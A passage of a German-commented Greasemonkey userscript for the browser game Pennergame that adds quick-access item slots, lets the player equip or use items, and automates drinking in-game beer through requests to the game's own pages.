            elem.style.left = (PB_X+2)+"px";
            elem.style.top = (PB_Y+18)+"px";
            elem.style.width = "32px";
            elem.style.height = "32px";
            if (elem.id != "actplunder")
                document.getElementById("actplunder").style.zIndex=1;
            if (elem.id != "actplunder2")
                document.getElementById("actplunder2").style.zIndex=1;
            if (elem.id != "actplunder3" && document.getElementById("actplunder3"))
                document.getElementById("actplunder3").style.zIndex=1;
            if (elem.id != "actplunder4" && document.getElementById("actplunder4"))
                document.getElementById("actplunder4").style.zIndex=1;
        }
        function mouseOut(e) {
            var elem=e.target;
            var xpos = (elem.id == "actplunder" || elem.id == "actplunder3")?2:18;
            var ypos = (elem.id == "actplunder" || elem.id == "actplunder2")?16:32;
            elem.style.left=(PB_X+xpos)+"px";
            elem.style.top=(PB_Y+ypos)+"px";
            elem.style.width="16px";
            elem.style.height="16px";
            var zInd = getZ("PBBACK")+1;
            document.getElementById("actplunder").style.zIndex=zInd;
            document.getElementById("actplunder2").style.zIndex=zInd;
            if (document.getElementById("actplunder3"))
                document.getElementById("actplunder3").style.zIndex=zInd;
            if (document.getElementById("actplunder4"))
                document.getElementById("actplunder4").style.zIndex=zInd;
        }
        var korr = (plunderimg == ICON_NOPLUNDEREQUIP)?1:0;
        for (var i = 0; i <= (nrOfTabs==6?3:1); i++) {
            if (i != 0) {
                plunderimg = plunderbox.getElementsByTagName("img")[i].getAttribute('src').toString();
                if (plunderimg.split('/').pop() != "empty.png") {
                	// Namen des aktuellen Plunderstücks extrahieren
                	plundername = plunderbox.getElementsByClassName("odd ztipfull trhover")[i-korr].getElementsByTagName("td")[1].innerHTML.split('</strong>')[0].split("<strong")[1].split(">")[1];
                }
                else {
                	korr++;
                	plunderimg = ICON_NOPLUNDEREQUIP;
                	plundername = TxtNoJunk[lang];
                }
            }
            var tab = content.split('/ajax/?c='+(i==3?5:(i+1)))[1].split('">')[1].split("<")[0];
            var actName = "actplunder"+(i==0?"":(i+1));
            var curElem = ShowImg('PBBACK', '/stock/plunder/', plunderimg, tab + ": " + plundername, 16, 16, 2+(i%2?16:0), 16+(i>1?16:0), 10, actName);
            if (curElem != null) {
                curElem.addEventListener("mouseover", mouseOver, false);
                curElem.addEventListener("mouseout", mouseOut, false);
            }
        }
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion extrahiert die eigene UserID
// **********************************************************************************
// **********************************************************************************
function getOwnUserID() {
    try {
        // Eigene UserID ermitteln
        var ownuserid = document.getElementById('my-profile').innerHTML.split('href="/profil/id:')[1];
        ownuserid = ownuserid.split('/"')[0];

        // Letzte gültige UserID speichern (z.B. beim Zugriff auf Pennerzone)
        GM_setValue("LastOwnUserID", ownuserid);

        return ownuserid;
    } catch(err) {
        GM_log("Fehler beim Ermitteln der eigenen UserID: " + err);

        // Letzte gültige UserID zurückgeben
        return GM_getValue("LastOwnUserID");
    }
}

// ********************************************************************************************************************
// ********************************************************************************************************************
// Funktion ermittelt anhand des Plundernamens die zugehörige "Action-Nummer", die der JS-Funktion zum Anlegen
// übergeben werden muss. Diese wird vom Spiel vorgegeben, kann sich jederzeit ändern und muss deswegen frisch
// ausgelesen werden
// ********************************************************************************************************************
// ********************************************************************************************************************
function GetActionNumber(content, plunderimg, plundername) {
    try {
        var ActionNumber = content.split(KEYWORD_JUNK[lang])[1];
        var plunderimg = plunderimg.split("~")[0];
        if (content.indexOf("/"+plunderimg) == -1)
            plunderimg = plunderimg.replace(/\....$/, '.png');
        if (content.indexOf("/"+plunderimg) == -1) {
            var pos = ActionNumber.search('> *' + plundername + ' *<');
            if (pos == -1)
                return "";
            ActionNumber = ActionNumber.substr(pos-50);
        }
        else
            ActionNumber = ActionNumber.split("/"+plunderimg)[1];
        ActionNumber = ActionNumber.split("change_stuff('")[1].split("'")[0];

        return ActionNumber;
    } catch(err) {
        GM_log("Fehler beim Abrufen der Action-Nummer für " + plundername);
        return "";
    }
}

// ********************************************************************************************************************
// ********************************************************************************************************************
// Funktion ermittelt die noch im Inventar vorhandene Anzahl eines Plunders
// ********************************************************************************************************************
// ********************************************************************************************************************
function GetNumberOfPlunder(content, plundername) {
    try {
        var reg = new RegExp(">" + plundername.replace(/([\\\(\)\[\]\*\+\-\%\^\$\.])/g, '\\$1') + " *<");
        var NumberOfPlunder = content.split(reg)[1];
        if (NumberOfPlunder.indexOf('<td class="col3">') != -1) {
            NumberOfPlunder = NumberOfPlunder.split('<td class="col3">')[1];
            NumberOfPlunder = NumberOfPlunder.split(TxtPiece[lang])[0];
        } else {
            NumberOfPlunder = NumberOfPlunder.split('<span')[1].split('</span')[0];
            NumberOfPlunder = trimString(NumberOfPlunder.split('">x')[1]);
        }


        return NumberOfPlunder;
    } catch(err) {
        GM_log("Fehler beim Abrufen der Plunderanzahl für " + plundername);
        return "";
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion prüft, ob ein Plunder mehrfach hintereinander benutzt werden kann
// **********************************************************************************
// **********************************************************************************
function isMultiUsablePlunder(plunder) {
    var MultiUsablePlunder = new Array ('flaschenlaster', 'geldbeutel', 'buch', 'seife', 'tageskarte', 'haustiertrick',  'gelbbeutel', 'boost_3000_pfandflaschen', 'hexenb', 'skiequ', 'schlitten2', 'plunder_zahn');
    plunder = plunder.split("/").pop().split('.')[0];
    for (var i=0; i < MultiUsablePlunder.length; i++)
        if (MultiUsablePlunder[i] == plunder)
            return true;
    return false;
}

// **********************************************************************************
// **********************************************************************************
// Funktion benutzt einen Plunder weitere Male oder beendet die Benutzung
// **********************************************************************************
// **********************************************************************************
function useMorePlunder(imgtitle, action, phref, mtimes, times, player, count, consume) {
    if (mtimes == 1) {
	GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL + (oldVersion ? "" : "ajax/?c=" + (nrOfTabs == 6?4:3)), onload:function(responseDetails) {
		var content = responseDetails.responseText;
		var doc = HTML2DOM(content);
		var anzPlunder = GetNumberOfPlunder(content, imgtitle);
		var succ = count - anzPlunder;
		if (succ == 0)
		    alert(printf(getLangTxt(TxtJunkNoSucc), imgtitle));
		else if (succ == 1 && times == 1)
		    alert(printf(getLangTxt(TxtJunkUsed), imgtitle));
		else if (succ == times)
		    alert(printf(getLangTxt(TxtJunkSucc), imgtitle, succ));
		else {
		    usePlunder(imgtitle, action, phref, times - succ, times, player, count, consume);
		    return;
		}
		// Seite refreshen
		refreshPage();
	    }
	});
    }
    else
	usePlunder(imgtitle, action, phref, mtimes - 1, times, player, count, consume);
}

// **********************************************************************************
// **********************************************************************************
// Funktion benutzt einen Plunder times mal
// **********************************************************************************
// **********************************************************************************
function usePlunder(imgtitle, action, phref, mtimes, times, player, count, consume) {
    var params = "";
    // URL für den Benutzungsrequest zusammenbauen
    if (oldVersion)
        var PLUNDERUSE_URL = PLUNDER_URL + 'use/' + action + '/';
    else if (phref.indexOf("choose_target") != -1) {
        var PLUNDERUSE_URL = PLUNDER_URL + "target_usage/";
        params = "plunderid2="+action+"&playername="+player;
    }
    else if (phref != "") {
        var PLUNDERUSE_URL = TOWNBASE_URL + phref.substr(1);
        params = "plunder="+action;
    }
    else {
        alert("unknown plunder use");
        return;
    }

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abrufen der Plunderbenutzung (--> Plunder wird benutzt)
    // **********************************************************************************
    GM_xmlhttpRequest({method: 'POST', url: PLUNDERUSE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                data: encodeURI(params),
                onload: function(responseDetails) {
                    var confShow = false;
                    if (!consume && responseDetails.responseText.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                        alert(printf(getLangTxt(TxtJunkUsed), imgtitle));
                        refreshPage();
                    }
                    else if (!oldVersion && player == "") {
                        var href = phref.replace('execboost', 'postuse');
                        if (responseDetails.responseText.indexOf(href) != -1) {
                            PLUNDERUSE_URL = TOWNBASE_URL + href.substr(1) + "?pid="+action;
                            GM_xmlhttpRequest({method: 'GET', url: PLUNDERUSE_URL,	onload: function(responseDetails) {
				useMorePlunder(imgtitle, action, phref, mtimes, times, player, count, consume);
                            }
                            });
                        }
                        else
                            confShow = true;
                    }
                    else
                        confShow = true;
                    if (confShow) {
			useMorePlunder(imgtitle, action, phref, mtimes, times, player, count, consume);
                    }
                }
                });
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt Plundericon in den Slot <slotnr> hinzu
// **********************************************************************************
// **********************************************************************************
function AddPlunderIcon(content, plunder, imgtitle, usemode, slotnr) {
    // Maximale Anzahl von Slots
    var row = Math.floor((slotnr - 1) / MAXNROFSLOTS);
    var col = (slotnr - 1) % MAXNROFSLOTS;
    row++;
    if (slotnr > 1 && slotnr % MAXNROFSLOTS == 0 && !document.getElementById('PDBACK'+row)) {
        ShowImg('PDBACK', '', ICON_PLUNDERDIRECTBACK[nrOfTabs == 6?0:1], '', '', '', 0, row*41, -2*row, 'PDBACK'+row);
    }
    row--;

    // Wenn noch nicht mehr Icons dargestellt werden, als maximal vorgesehen
    if (slotnr  > 0) {
        var ActionNumber = GetActionNumber(content, plunder, imgtitle);

        var actPlunder = PGu_getValue("LastPlunderName", "");
        // **********************************************************************************
        // Wenn der aktuelle Plunder ein anlegbarer Plunder ist mit Stückzahl 0
        // **********************************************************************************
        if (usemode == "A" && ActionNumber == "" && imgtitle != actPlunder) {
            // Aktuellen Plunder aus der Liste entfernen
            RemovePlunderFromList(plunder + "*" + imgtitle + "*A");
            alert(printf(getLangTxt(TxtNoJunkLeft2), imgtitle));
            return -1;
        }
        // **********************************************************************************
        // Wenn der aktuelle Plunder ein benutzbarer Plunder ist mit Stückzahl 0
        // **********************************************************************************
        if (usemode == "B" && ActionNumber == "") {
            // Aktuellen Plunder aus der Liste entfernen
            RemovePlunderFromList(plunder + "*" + imgtitle + "*B");
            alert(printf(getLangTxt(TxtNoJunkLeft), imgtitle));
            return -1;
        }
        // **********************************************************************************
        // sonst: Der aktuelle Plunder wird angelegt, oder es ist ein benutzbarer Plunder, der noch vorhanden ist
        // **********************************************************************************
        var imgtop = oldVersion?18:14 + row * 41;
        var imgleft = 1 + col * 28;

        if (imgtitle.indexOf(TxtTrikot[lang]) != -1)
            PGu_setValue("TrikotanzeigeAus", 0);
        // Wenn der Plunder angelegt werden soll
        if (usemode == "A") {
            var titletext = getLangTxt(TxtEquip) + ": " + imgtitle;
            var usemodeimg = ICON_PLUNDERA;
            var usemodetitletext = getLangTxt(TxtEquipThisJunk);
        // sonst: Der Plunder soll benutzt werden
        } else {
            var anzPlunder = GetNumberOfPlunder(content, imgtitle);
            var titletext = printf(getLangTxt(TxtUseJunk), getLangTxt(TxtUse), imgtitle, anzPlunder);
            var usemodeimg = ICON_PLUNDERB;
            var usemodetitletext = getLangTxt(TxtUseThisJunk);
            var tdpm = content.indexOf('id="pm_'+ActionNumber+'"');
            if (tdpm != -1) {
                var href = content.substr(tdpm).split('<a href="')[3].split('"')[0];
		if (href.substr(0,4) == "java") {
                    href = content.substr(tdpm).split('<form')[1].split('action="')[1].split('"')[0];
                    ActionNumber = content.substr(tdpm).split('<input')[1].split('value="')[1].split('"')[0];
		}
            }
	    else
                var href = "";
        }

        // Plundergrafik zusammenbauen
        var newimg = ShowImg('PDBACK', '', getPicAddr(plunder), titletext, '', '', imgleft, imgtop, 1, 'directplunderpic' + slotnr);
        if (newimg == null)
            return 0;
        newimg.style.cursor = 'pointer';
        //newimg.setAttribute('name', usemode);
        var modeimgtop = imgtop + (oldVersion?28:32);
        ShowImg('PDBACK', '', getIconAddr(usemodeimg), usemodetitletext, '', '', imgleft, modeimgtop, 1, 'directplundermodepic' + slotnr);

        // **********************************************************************************
        // Click-Event hinzufügen
        // **********************************************************************************
        newimg.addEventListener("click", function(event)
        {
            var ownuserid = m_ownuserid;

            // **********************************************************************************
            // Wenn es sich um einen anlegbaren Plunder handelt
            // **********************************************************************************
            if (usemode == "A") {
                PGu_setValue("LastPlunderImg", getPicAddr(plunder));
                PGu_setValue("LastPlunderName", imgtitle);

                // Cursor soll Wartesymbol zeigen
                document.body.style.cursor = "wait";
                this.style.cursor = "wait";

                if (!oldVersion) {
                	document.getElementById("actplunder").style.zIndex=1;
                	document.getElementById("actplunder2").style.zIndex=1;
                	if (document.getElementById("actplunder3"))
                		document.getElementById("actplunder3").style.zIndex=1;
                	if (document.getElementById("actplunder4"))
                		document.getElementById("actplunder4").style.zIndex=1;
                }

                // Angelegten Plunder anzeigen
                ShowCurrentPlunder(getPicAddr(plunder), imgtitle, 1);

                // **********************************************************************************
                // *** GM_XMLHTTPREQUEST *** POSTEN des Plunderwechsels
                // **********************************************************************************
                GM_xmlhttpRequest({method: 'POST', url: PLUNDERCHANGE_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                	data: encodeURI('f_plunder=' + ActionNumber),
                	onload: function(responseDetails) {
                		// Seite refreshen
                		refreshPage();
                	}
                });

            // **********************************************************************************
            // sonst: Es handelt sich um einen benutzbaren Plunder
            // **********************************************************************************
            } else {
                // bei PG reloaded: testen, ob es ein Alkohol-Plunder ist (wird nicht verbraucht)
                var confUse = true;
                var consume = true;
                var useTimes = 1;
                if (!oldVersion) {
                    for (var i = 0; i < alcoplunder.length; i++)
                        if (alcoplunder[i] == imgtitle)
                            break;
                    if (i < alcoplunder.length)
                        consume = false;    // Plunder wird nicht verbraucht
                }

                if (href.indexOf("choose_target") != -1) {
                    var player = prompt(getLangTxt(TxtPlayerName), "");
                    if (!player)
                        return;
                }
                else {
                    var player = "";
                }
                if (consume) {
                    if (parseInt(anzPlunder) > 1 &&
                        (isMultiUsablePlunder(plunder) || player != "")) {
                        var prmptTxt = getLangTxt(TxtMultiPlunder1);
                        while (true) {
                            useTimes = prompt(printf(prmptTxt, anzPlunder) + getLangTxt(TxtMultiPlunder), "1");
                            if (!useTimes)
                                return;
                            if (useTimes == null) {
                                useTimes = 0;
                                break;
                            }
                            if (isNaN(useTimes))
                                prmptTxt = getLangTxt(TxtMultiPlunder2);
                            else if (parseInt(useTimes) > parseInt(anzPlunder))
                                prmptTxt = getLangTxt(TxtMultiPlunder3);
                            else
                                break;
                        }
                        confUse = useTimes > 0;
                    }
                    else {
                        confUse = confirm(printf(getLangTxt(TxtReallyUseJunk), imgtitle, GetNumberOfPlunder(content, imgtitle)));
                    }
                }
                // Wenn die Sicherheitsabfrage durch Drücken des "OK"-Buttons positiv beantwortet wurde
                if (confUse) {
                    usePlunder(imgtitle, ActionNumber, href, useTimes, useTimes, player, parseInt(anzPlunder), consume);
                }
            }
        }, false);
        return 0;
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt Icon zum Zurücksetzen der Direktplunderliste hinzu
// **********************************************************************************
// **********************************************************************************
function AddResetIcon(plundertable) {

    // Link zusammenbauen
    var newlink = document.getElementById("content").appendChild(document.createElement('a'));
    newlink.setAttribute('href', '');

    // Grafik zusammenbauen
    var newimg = newlink.appendChild(document.createElement('img'));
    newimg.setAttribute('src', getIconAddr(ICON_PLUNDERRESET));
    newimg.setAttribute('border', '0');
    newimg.setAttribute('title', getLangTxt(TOOLTIP_PLUNDERRESET));
    newimg.setAttribute('style', 'position:absolute; left:540px; top:50px; z-index:100');

    // Click-Event hinzufügen
    newimg.addEventListener("click", function(event)
    {
        // Plunderliste zurücksetzen
        ResetPlunderList();
    }, false);
}

// **********************************************************************************
// Funktion ermittelt die Adresse eines Bildes
// **********************************************************************************
function getPicAddr(image) {
    var imgSplit = image.split("~");
    var indx = 0;
    if (nrOfTabs == 6)
        indx = 1;
    if (imgSplit.length > 1) {
        indx = imgSplit[1];
        if (indx > PLUNDERIMAGE_URL.length)
            indx = 0;
    }
    if (imgSplit.length == 1)
        PGu_setValue("PlunderDirectAccess", PGu_getValue("PlunderDirectAccess", "").replace(image, image+"~"+indx));
    return PLUNDERIMAGE_URL[indx] + imgSplit[0];
}

// **********************************************************************************
// Funktion ermittelt aus einer Tabellenzeile den Dateinamen des Plunders
// **********************************************************************************
function GetPlunderPic(currenttr) {
    try {
        for (i = 0; i < PLUNDERIMAGE_URL.length; i++) {
            var plunderpic = currenttr.getElementsByTagName("img")[0].getAttribute("src").split(PLUNDERIMAGE_URL[i]);
            if (plunderpic.length > 1)
            break;
        }
        return trimString(plunderpic[plunderpic.length - 1]) + "~" + i;
    } catch(err) {
        GM_log("Fehler beim Ermitteln des Plunder-Images: " + err);
    }
}

// **********************************************************************************
// Funktion ermittelt aus einer Tabellenzeile den Namen des Plunders
// **********************************************************************************
function GetPlunderName(currenttr) {
    try {
        var pName = currenttr.getElementsByTagName("a")[0].innerHTML;
        if (pName.indexOf('>') != -1)
            pName = pName.split('>')[1].split('<')[0];
        return trimString(pName);
    } catch(err) {
        GM_log("Fehler beim Ermitteln des Plundernamens: " + err);
    }
}

// **********************************************************************************
// Funktion überprüft, ob sich ein Plunder in der Direktzugriffsliste befindet
// **********************************************************************************
function IsPlunderInList(plunderinfo) {
    var pInfo = plunderinfo;
    var piSplit = pInfo.split("~");
    if (piSplit.length == 1) {
        var pos = pInfo.indexOf("*");
        pInfo = pInfo.substr(0, pos) + "~" + (nrOfTabs == 6)?1:0 + pInfo.substr(pos);
    }
    var plunderList = PGu_getValue("PlunderDirectAccess", "");
    try {
    	// Wenn sich die gesuchte Plunderinfo in der Direktzugriffsliste befindet
        var found = true;
        var pList = plunderList.split(pInfo);
    	if (pList.length == 1)
            pList = plunderList.split(plunderinfo);
    	if (pList.length == 1)
            pList = plunderList.split("*"+plunderinfo.split('*')[1]+"*");
    	if (pList.length == 1) {
            pList = ("|" + plunderList).split("|"+pInfo.split("~")[0]);
            found = false;
        }
    	if (pList.length > 1) {
            var pInd = pList[0].split("|").length;
            if (pInfo != plunderinfo || !found) {
                var plinfo = plunderList.split("|");
                plinfo[pInd-1] = pInfo;
                plunderList = plinfo.join("|");
                PGu_setValue("PlunderDirectAccess", plunderList);
            }
            return pInd;
        // sonst: Die gesuchte Plunderinfo befindet sich nicht in der Direktzugriffsliste
        } else {
            return 0;
        }
    } catch(err) {
    	GM_log("Fehler in IsPlunderInList: " + err);
    }
}

// **********************************************************************************
// Funktion setzt die Direktzugriffsliste zurück auf leer
// **********************************************************************************
function ResetPlunderList() {
    PGu_setValue("PlunderDirectAccess", "");
}

// **********************************************************************************
// Funktion ermittelt die Anzahl der Plunderstücke in der Direktzugriffsliste
// **********************************************************************************
function GetNrOfPlunderInList() {
    return PGu_getValue("PlunderDirectAccess", "").split("|").length - 1;
}

// **********************************************************************************
// Funktion fügt ein Plunderstück in die Direktzugriffsliste hinzu
// **********************************************************************************
function AddPlunderToList(plunderinfo) {
    PGu_setValue("PlunderDirectAccess", PGu_getValue("PlunderDirectAccess", "") + plunderinfo + "|");
    if (plunderinfo.indexOf("chest_glow") != -1)
        GM_setValue("noFirefly", 0);
}

// **********************************************************************************
// Funktion entfernt ein Plunderstück aus der Direktzugriffsliste
// **********************************************************************************
function RemovePlunderFromList(plunderinfo) {
    if (plunderinfo.indexOf("chest_glow") != -1)
        GM_setValue("noFirefly", 1);

    var plunderNr = IsPlunderInList(plunderinfo) - 1;
    if (plunderNr < 0)
        return;         // Plunder nicht in Liste

    // Speichern der neuen Direktzugriffsliste
    var pList = PGu_getValue("PlunderDirectAccess", "").split("|");
    pList.splice(plunderNr, 1);
    PGu_setValue("PlunderDirectAccess", pList.join("|"));
}

// **********************************************************************************
// Funktion ermittelt das n-te Plunderstück der Direktzugriffsliste
// **********************************************************************************
function GetNthPlunderinfoFromList(n) {
    return PGu_getValue("PlunderDirectAccess", "").split("|")[n - 1];
}

// **********************************************************************************
// Funktion extrahiert den Dateinamen des Bildes aus der Plunderinfo
// **********************************************************************************
function GetPicFromPlunderInfo(plunderinfo) {
    return plunderinfo.split("*")[0];
}

// **********************************************************************************
// Funktion extrahiert den Plundernamen aus der Plunderinfo
// **********************************************************************************
function GetNameFromPlunderInfo(plunderinfo) {
    return plunderinfo.split("*")[1];
}

// **********************************************************************************
// Funktion extrahiert die Benutzungsart aus der Plunderinfo
// **********************************************************************************
function GetUsemodeFromPlunderInfo(plunderinfo) {
    var usermode = plunderinfo.split("*")[2];

    if (typeof usermode != 'undefined') {
        return usermode;
    } else {
        return "A";
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion entfernt alle Plunderstücke aus der Anzeige
// **********************************************************************************
// **********************************************************************************
function HideAllPlunder() {
    for (var i = 1; true; i++) {
        var currentplunderpic = document.getElementById('directplunderpic' + i);
        if (currentplunderpic != null) {
            currentplunderpic.parentNode.removeChild(currentplunderpic);
        }
        else
            break;
        if (i % MAXNROFSLOTS == 0) {
            var row = Math.floor((i-1)/MAXNROFSLOTS) + 1;
            var currentbgpic = document.getElementById('PDBACK'+row);
            if (currentbgpic != null)
                currentbgpic.parentNode.removeChild(currentbgpic);
        }

        var currentplundermodepic = document.getElementById('directplundermodepic' + i);
        if (currentplundermodepic != null) {
            currentplundermodepic.parentNode.removeChild(currentplundermodepic);
        }
    }

    var addicon = document.getElementById('AddPlunderIcon');
    if (addicon != null) {
        addicon.parentNode.removeChild(addicon);
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion zeigt alle Plunderstücke an
// **********************************************************************************
// **********************************************************************************
function ShowAllPlunder(content, NrOfPlunder, step, marker) {
    // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
    if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
        if (step > 0 && collAllPlunder != marker)
            return;
        if (step > 0 && step <= nrOfTabs) {
            GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL+'ajax/?c='+step, onload:function(responseDetails) {
                if (responseDetails.responseText.indexOf('plunder_menu') != -1)
                	ShowAllPlunder (content + responseDetails.responseText, NrOfPlunder, step + 1, marker);
                else
                	ShowAllPlunder (content, NrOfPlunder, step, marker);
            }});
            return;
        } else if (step <= 0) {
            if (step < 0)
                if (saveAllPlunder == "")
                	step = 0;
                else
                	content = saveAllPlunder;
            if (step == 0 && !oldVersion) {
                collAllPlunder++;
                ShowAllPlunder (KEYWORD_MYBUM[lang] + KEYWORD_JUNK[lang], NrOfPlunder, step + 1, collAllPlunder);
                return;
            }
        }
        else if (step == nrOfTabs+1)
            saveAllPlunder = content;
        var slotcorrect = 0;
        // Für alle Plunderstücke
        for (var i = 1; i <= NrOfPlunder; i++) {
            var plunderinfo = GetNthPlunderinfoFromList(i + slotcorrect);
            slotcorrect = slotcorrect + AddPlunderIcon(content, GetPicFromPlunderInfo(plunderinfo), GetNameFromPlunderInfo(plunderinfo), GetUsemodeFromPlunderInfo(plunderinfo), i + slotcorrect);
        }

        // Zahl der Plunderstücke ggf. korrigieren, falls benutzbare Plunderstücke nicht mehr vorhanden sind
        NrOfPlunder = NrOfPlunder + slotcorrect;

        // Wenn weniger als 9 Plunder eingetragen sind
            // +-Icon anzeigen
            ShowImg('PDBACK', PLUNDER_URL, ICON_PLUNDERFREE, getLangTxt(TOOLTIP_PLUNDERAUSWAHL), '', '', 1 + (NrOfPlunder % MAXNROFSLOTS) * 28, Math.floor(NrOfPlunder/MAXNROFSLOTS)*41 + 18, 1, 'AddPlunderIcon');
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion liefert die aktuellen Punkte zurück
// **********************************************************************************
// **********************************************************************************
function GetPunkte(doc) {
    var punkte = doc.getElementsByClassName("icon award")[0].getElementsByTagName("a")[0];
    punkte = Number(trimString(punkte.innerHTML));

    return punkte;
}

// **********************************************************************************
// **********************************************************************************
// Funktion liefert die aktuellen Promille zurück
// **********************************************************************************
// **********************************************************************************
function GetPromille(doc) {
    var promille = doc.getElementsByClassName("icon beer")[0].getElementsByTagName("a")[0];
    promille = Number(trimString(trimString(promille.innerHTML).substr(0, 6)));

    return promille;
}

// **********************************************************************************
// **********************************************************************************
// Funktion formatiert eine Zahl mit Tausendertrennzeichen
// **********************************************************************************
// **********************************************************************************
function money_format(zahl) {
    var new_string = [];
    var nachkomma = Right$('0' + Math.round((zahl - parseInt(zahl)) * 100), 2);
    var tmp = parseInt(zahl) + '';

    while( tmp.length > 3)
    {
        new_string[new_string.length] = tmp.substr(tmp.length - 3 ) ;
        tmp = tmp.substr(0, tmp.length -3 )
    }
    if(tmp)  new_string[new_string.length] = tmp;
    if (currency1 == "")
        return currency + ' ' + new_string.reverse().join(getLangTxt(TZ)) + getLangTxt(DZ) + nachkomma;
    else
        return new_string.reverse().join(getLangTxt(TZ)) + currency1 + parseInt(nachkomma) + currency2;
}

// **********************************************************************************
// **********************************************************************************
// Funktion blendet Werte in einen Text ein
// **********************************************************************************
// **********************************************************************************
function printf(text) {
    var i = 1;
    var prozPos = -1;

    while (i < printf.arguments.length && (prozPos = text.indexOf('%', prozPos + 1)) >= 0) {
        var format = text.substr(prozPos + 1, 1);
        switch (format) {
            case 'd':
            case 's':
                var neuText = printf.arguments[i++];
                break;
            case 'm':
                var neuText = money_format(printf.arguments[i++]);
                break;
            default:
                continue;
        }
        text = text.substr(0, prozPos) + neuText + text.substr(prozPos + 2);
        prozPos = prozPos + neuText.length - 1;
    }
    return text;
}

// **********************************************************************************
// **********************************************************************************
// Funktion aktiviert Wartecursor in Abhängigkeit des waitflags
// **********************************************************************************
// **********************************************************************************
function CursorWait(currentelem, waitflag) {
    if (waitflag) {
        currentelem.style.cursor = 'progress';
        document.body.style.cursor = 'progress';
    } else {
        currentelem.style.cursor = 'pointer';
        document.body.style.cursor = 'auto';
    }
}

// **********************************************************************************
// **********************************************************************************
// Funktion ermittelt zur Verfügung stehende Anzahl des Nahrungsmittels "food"
// **********************************************************************************
// **********************************************************************************
function GetNrOfFood(content, food) {
    if (content.indexOf(' ' + food) == -1)
        return "x";
    var sfood = content.split(' ' + food);
    var nr = sfood[sfood.length-2];
    nr = nr.split('<span>')[nr.split('<span>').length - 1].split(' ')[0];
    if (isNaN(nr)) {
        var splitfood = food.split(' ');
        splitfood[0] = splitfood[0].substr(0, splitfood[0].length - 1);
        sfood = content.split(' ' + splitfood.join(' '));
        if (sfood.length < 2)
            return "x";
        nr = sfood[sfood.length-2];
        nr = nr.split('<span>')[nr.split('<span>').length - 1].split(' ')[0];
    }

    return nr;
}

// **********************************************************************************
// **********************************************************************************
// Funktion fügt den Handler zum Auto-Trinken ein
// **********************************************************************************
// **********************************************************************************
function PromilleUpHandler(currentelem) {
    var wpromille = TAisDrink2?2:2.5;
    currentelem.style.cursor = 'pointer';

    // **********************************************************************************
    // EVENTHANDLER
    // **********************************************************************************
    currentelem.addEventListener('click', function(event) {

        // **********************************************************************************
        // Funktion prüft, ob die Promillezahl wirklich auf über 2,5 bzw. 2,0 gestiegen ist
        // **********************************************************************************
        function CheckPromilleUpSuccess(content) {
            // Seite refreshen
            refreshPage();
            var promille = GetPromille(HTML2DOM(content));
            // Wenn der Alkoholpegel auf ein unkritisches Niveau gestiegen ist
            if (promille >= wpromille) {
                // User benachrichtigen
                if (EatDrinkFeedBack)
                	alert(getLangTxt(TxtHiccup));
            // sonst: Der Alkoholpegel ist NICHT auf ein unkritisches Niveau gestiegen
            } else {
                // User benachrichtigen
                alert(printf(getLangTxt(TxtDrinkError), promille));
            }
        }

        // **********************************************************************************
        // Funktion sendet das POST zum Trinken
        // **********************************************************************************
        function DrinkIt(nrofbeer) {
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** POSTEN der Getränkenutzung
            // **********************************************************************************
            GM_xmlhttpRequest({method: 'POST', url: EAT_URL, headers: {'Content-type': 'application/x-www-form-urlencoded'},
                data: encodeURI('item=&promille=&id=' + ID_BEER + '&menge=' + nrofbeer),
                onload: function(responseDetails)	{
                	// Erfolg prüfen
                	CheckPromilleUpSuccess(responseDetails.responseText);
                }
            });
        }

        // **********************************************************************************
        // Funktion prueft die Anzahl der Biere und trinkt sie bzw. gibt eine Meldung aus
        // **********************************************************************************
        function DrinkBeer(content, nrofbeers) {
            // Verfügbare Anzahl Bier abrufen
            var drink = TxtBeer1[lang];
            var stacknrofbeer = GetNrOfFood(content, drink);

            // Wenn Bier nicht gefunden wurde
            if (isNaN(stacknrofbeer)) {
                drink = TxtBeer2[lang];
                stacknrofbeer = GetNrOfFood(content, drink);
            }

            // ***********************************************************************************************
            // Wenn genügend Trinken vorhanden ist
            // ***********************************************************************************************
            if (stacknrofbeer >= nrofbeers) {
                // Trinken gehen
                DrinkIt(nrofbeers);

                // Keinen Wartecursor anzeigen
                if (currentelem)
                    CursorWait(currentelem, false);
            // ***********************************************************************************************
            // sonst: Es ist nicht genügend Trinken vorhanden
            // ***********************************************************************************************
            } else {
                // Keinen Wartecursor anzeigen
                if (currentelem)
                    CursorWait(currentelem, false);
                // Benutzer benachrichtigen
                var drinktext = drink.split(' ');
                drink = drinktext[drinktext.length - 1];
                if (lang != 0)
                    drink = drink.toLowerCase();
                alert(printf(getLangTxt(TxtNotMuchToDrink), drink));
            }
        }

        // **********************************************************************************
        // Funktion sucht einen Plunder im doc
        // **********************************************************************************
        function suchePlunder(doc, plundername, type) {
            // Referenz auf Plundertabelle speichern
            var plundertable = doc.getElementsByTagName("table")[0];
            // Referenz auf Zeilen der Plundertabelle speichern
            var plundertrs = plundertable.getElementsByTagName("tr");

            for (var i = oldVersion; i < plundertrs.length; i++) {
                if (restPlunder != "")
                	if (restPlunder == GetPlunderName(plundertrs[i]))
                		restIndex = i - oldVersion + 1;
                if (type == "")
                	if (plundername == GetPlunderName(plundertrs[i]))
                		return i - oldVersion + 1;
                if (type != "") {
                	var td = plundertrs[i].getElementsByTagName("td")[5];
                	if (type == "B")
                		td = plundertrs[i].getElementsByTagName("td")[4];
                	// **********************************************************************************
                	// Wenn das Plunderstück anlegbar oder benutzbar und nicht plundername ist
                	// **********************************************************************************
                	if (td.getElementsByTagName("a").length > 0 && plundername != GetPlunderName(plundertrs[i]))
                		return i - oldVersion + 1;
                }
            }

